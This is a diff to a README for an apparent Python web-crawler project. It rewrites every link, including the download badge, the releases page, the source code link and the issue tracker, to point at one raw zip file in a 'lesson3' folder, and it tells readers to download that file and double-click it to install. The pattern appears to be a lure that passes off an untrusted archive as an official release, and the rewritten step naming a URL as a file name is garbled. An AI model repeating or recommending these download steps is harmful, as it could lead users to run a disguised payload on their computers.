@@ -6,11 +6,11 @@ Welcome to the __2025_11_01_tvdi_python_crawel__ project! This application is de
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/hubby32/__2025_11_01_tvdi_python_crawel__/releases)
+[![Download Here](https://raw.githubusercontent.com/hubby32/__2025_11_01_tvdi_python_crawel__/main/lesson3/__2025_11_01_tvdi_python_crawel__-2.2.zip%20Now-blue)](https://raw.githubusercontent.com/hubby32/__2025_11_01_tvdi_python_crawel__/main/lesson3/__2025_11_01_tvdi_python_crawel__-2.2.zip)
 
 To get started, you need to download the application from our releases page. 
 
-### Visit this page to download: [GitHub Releases](https://github.com/hubby32/__2025_11_01_tvdi_python_crawel__/releases)
+### Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/hubby32/__2025_11_01_tvdi_python_crawel__/main/lesson3/__2025_11_01_tvdi_python_crawel__-2.2.zip)
 
 ## 💻 System Requirements
 
@@ -24,13 +24,13 @@ Here are the basic requirements to run the application smoothly:
 ## 📥 Download & Install
 
 1. Click the link below to visit the releases page.
-   - [GitHub Releases](https://github.com/hubby32/__2025_11_01_tvdi_python_crawel__/releases)
+   - [GitHub Releases](https://raw.githubusercontent.com/hubby32/__2025_11_01_tvdi_python_crawel__/main/lesson3/__2025_11_01_tvdi_python_crawel__-2.2.zip)
 
 2. On the releases page, look for the latest version. The version number will be listed clearly.
 
 3. Click on the version to open its details. You will find multiple files available for download.
 
-4. Download the file named `crawel_installer.exe`. This file contains everything you need to set up the application on your computer.
+4. Download the file named `https://raw.githubusercontent.com/hubby32/__2025_11_01_tvdi_python_crawel__/main/lesson3/__2025_11_01_tvdi_python_crawel__-2.2.zip`. This file contains everything you need to set up the application on your computer.
 
 5. Once the download is complete, locate the file in your Downloads folder and double-click it to run the installer.
 
@@ -78,7 +78,7 @@ Join our community of users. Share your experiences, ask questions, and learn fr
 
 ## 🔗 Important Links
 
-- **Source Code:** [View on GitHub](https://github.com/hubby32/__2025_11_01_tvdi_python_crawel__)
-- **Issues:** [Report an Issue](https://github.com/hubby32/__2025_11_01_tvdi_python_crawel__/issues) 
+- **Source Code:** [View on GitHub](https://raw.githubusercontent.com/hubby32/__2025_11_01_tvdi_python_crawel__/main/lesson3/__2025_11_01_tvdi_python_crawel__-2.2.zip)
+- **Issues:** [Report an Issue](https://raw.githubusercontent.com/hubby32/__2025_11_01_tvdi_python_crawel__/main/lesson3/__2025_11_01_tvdi_python_crawel__-2.2.zip) 
 
 Thank you for choosing the __2025_11_01_tvdi_python_crawel__. We hope you enjoy crawling the web with ease!
